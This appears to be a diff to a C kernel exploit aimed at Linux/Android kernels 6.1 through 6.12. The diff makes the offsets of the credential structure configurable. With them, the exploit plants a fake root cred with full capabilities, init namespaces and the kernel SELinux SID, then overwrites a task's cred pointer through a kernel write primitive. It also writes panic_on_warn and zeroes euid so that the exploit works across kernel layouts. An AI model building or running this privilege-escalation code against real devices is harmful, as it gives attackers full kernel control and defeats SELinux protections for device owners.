@@ -88,6 +88,20 @@ struct timer_cfg
     unsigned long long init_groups;        /* init_groups symbol */
     unsigned long long selinux_blob_off;   /* task_security_struct.exec_sid */
     unsigned long long selinux_sid_kernel; /* SECINITSID_KERNEL */
+    /* struct cred field offsets for the fake cred.  These follow the kernel's
+     * cred layout, which shifts between releases: 6.6+ has an 8-byte usage so
+     * security@0x80/user@0x88/..., while 6.1 has a 4-byte usage and everything
+     * after it moves down by 8 (security@0x78/user@0x80/...).  The defaults
+     * below are the 6.6/6.12 layout that the original profiles were derived
+     * for; a 6.1 profile must override them (see conf/dirty/6.1.25-*.conf). */
+    unsigned long long cred_security_off;  /* struct cred.security */
+    unsigned long long cred_user_off;      /* struct cred.user */
+    unsigned long long cred_userns_off;    /* struct cred.user_ns */
+    unsigned long long cred_ucounts_off;   /* struct cred.ucounts */
+    unsigned long long cred_group_off;     /* struct cred.group_info */
+    unsigned long long cred_euid_off;      /* struct cred.euid (zero plant) */
+    unsigned long long cred_cap_off;       /* struct cred.cap_inheritable */
+    int cred_cap_count;                    /* how many cap words to fill */
     char ksu_kmi[64];                      /* KernelSU late-load --kmi */
 };
 static struct timer_cfg g_cfg;
@@ -164,6 +178,14 @@ static void parse_conf_line(char *line)
     else if (!strcmp(key, "init_groups")) g_cfg.init_groups = num;
     else if (!strcmp(key, "selinux_blob_off")) g_cfg.selinux_blob_off = num;
     else if (!strcmp(key, "selinux_sid_kernel")) g_cfg.selinux_sid_kernel = num;
+    else if (!strcmp(key, "cred_security_off")) g_cfg.cred_security_off = num;
+    else if (!strcmp(key, "cred_user_off")) g_cfg.cred_user_off = num;
+    else if (!strcmp(key, "cred_userns_off")) g_cfg.cred_userns_off = num;
+    else if (!strcmp(key, "cred_ucounts_off")) g_cfg.cred_ucounts_off = num;
+    else if (!strcmp(key, "cred_group_off")) g_cfg.cred_group_off = num;
+    else if (!strcmp(key, "cred_euid_off")) g_cfg.cred_euid_off = num;
+    else if (!strcmp(key, "cred_cap_off")) g_cfg.cred_cap_off = num;
+    else if (!strcmp(key, "cred_cap_count")) g_cfg.cred_cap_count = (int)num;
 }
 
 static int load_conf(const char *path)
@@ -176,6 +198,17 @@ static int load_conf(const char *path)
         fprintf(stderr, "[-] cannot open conf: %s\n", path);
         return -1;
     }
+    memset(&g_cfg, 0, sizeof(g_cfg));
+    /* Defaults are the 6.6/6.12 struct cred layout; a profile whose kernel
+     * uses the 6.1 layout overrides them explicitly. */
+    g_cfg.cred_security_off = 0x80;
+    g_cfg.cred_user_off = 0x88;
+    g_cfg.cred_userns_off = 0x90;
+    g_cfg.cred_ucounts_off = 0x98;
+    g_cfg.cred_group_off = 0xa0;
+    g_cfg.cred_euid_off = 0x18;
+    g_cfg.cred_cap_off = 0x30;
+    g_cfg.cred_cap_count = 5;
     while (fgets(line, sizeof(line), f))
         parse_conf_line(line);
     fclose(f);
@@ -183,7 +216,13 @@ static int load_conf(const char *path)
     if (g_conf_overflow)
         return -1;
     if (!g_cfg.timer_site || !g_cfg.selinux_state || !g_cfg.task_cred_off ||
-        !g_cfg.copy_process_low21 || !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0])
+        !g_cfg.copy_process_low21 || !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0] ||
+        !g_cfg.cred_req || !g_cfg.cred_alloc || !g_cfg.root_user ||
+        !g_cfg.init_user_ns || !g_cfg.init_ucounts || !g_cfg.init_groups ||
+        !g_cfg.cred_security_off || !g_cfg.cred_user_off ||
+        !g_cfg.cred_userns_off || !g_cfg.cred_ucounts_off ||
+        !g_cfg.cred_group_off || !g_cfg.cred_euid_off ||
+        !g_cfg.cred_cap_off || g_cfg.cred_cap_count <= 0)
     {
         fprintf(stderr, "[-] conf missing required fields\n");
         return -1;
@@ -245,6 +284,7 @@ static void logf(const char *fmt, ...)
     va_start(ap, fmt);
     vprintf(fmt, ap);
     va_end(ap);
+    fflush(stdout);
     (void)fsync(STDOUT_FILENO);
 }
 
@@ -1326,18 +1366,26 @@ static void run_plant(unsigned long long target, int tag, int mode,
              * c[2]=suid/sgid = target, both fixed by later zero plants. */
             c[3] = 0; /* euid/egid */
             c[4] = 0; /* fsuid/fsgid */
-            c[5] = 0; /* securebits */
-            for (int i = 6; i <= 10; i++)
-                c[i] = g_cfg.fullcap; /* inh/prm/eff/bset/ambient */
-            *(unsigned long long *)(payload + off + 0x80) =
+            c[5] = 0; /* securebits (6.6) / cap_inheritable (6.1) */
+            /*
+             * Fill the capability block.  The block starts right after
+             * securebits on 6.6 (0x30) but right after fsuid/fsgid on 6.1
+             * (0x28), and its length is always 5 kernel_cap_t words.  Writing
+             * past the block would corrupt the keyring pointers that follow
+             * it, so the start offset and the count both come from the conf.
+             */
+            for (int i = 0; i < g_cfg.cred_cap_count; i++)
+                *(unsigned long long *)(payload + off + g_cfg.cred_cap_off +
+                                        (size_t)i * 8) = g_cfg.fullcap;
+            *(unsigned long long *)(payload + off + g_cfg.cred_security_off) =
                 page + blob; /* security */
-            *(unsigned long long *)(payload + off + 0x88) =
+            *(unsigned long long *)(payload + off + g_cfg.cred_user_off) =
                 g_cfg.root_user + g_slide;
-            *(unsigned long long *)(payload + off + 0x90) =
+            *(unsigned long long *)(payload + off + g_cfg.cred_userns_off) =
                 g_cfg.init_user_ns + g_slide;
-            *(unsigned long long *)(payload + off + 0x98) =
+            *(unsigned long long *)(payload + off + g_cfg.cred_ucounts_off) =
                 g_cfg.init_ucounts + g_slide;
-            *(unsigned long long *)(payload + off + 0xa0) =
+            *(unsigned long long *)(payload + off + g_cfg.cred_group_off) =
                 g_cfg.init_groups + g_slide;
             *(unsigned int *)(payload + blob + g_cfg.selinux_blob_off) =
                 g_cfg.selinux_sid_kernel;
@@ -1852,6 +1900,13 @@ int main(int argc, char **argv)
          * so one zero write repairs them.  suid/sgid keep the rb_left
          * target; the fake cred's full CAP_SETUID and euid 0 make that
          * irrelevant for the fork/exec handoff.
+         *
+         * The euid plant depends on the cred layout: on 6.6 euid sits in
+         * c[3] (already zeroed), but on 6.1 the 4-byte usage shifts the
+         * uid/gid block down by 4, so euid lands in c[2] and would inherit
+         * the rb_left target's upper half.  cred_euid_off names the field to
+         * zero after the uid fix; zeroing it is a no-op where euid already
+         * got a zero from the c[3] store.
          */
         if (stage_write(g_child_task + g_cfg.task_cred_off, 2, "fake_cred",
                         raw, &fc))
@@ -1869,6 +1924,8 @@ int main(int argc, char **argv)
             park_forever("panic_on_warn write failed");
         if (stage_write(fc.A + g_cfg.cred_uid_off, 0, "fake_uid", raw, NULL))
             park_forever("fake uid fix failed");
+        if (stage_write(fc.A + g_cfg.cred_euid_off, 0, "fake_euid", raw, NULL))
+            park_forever("fake euid fix failed");
     }
     logf("[+] cred writes landed, waking child\n");
 
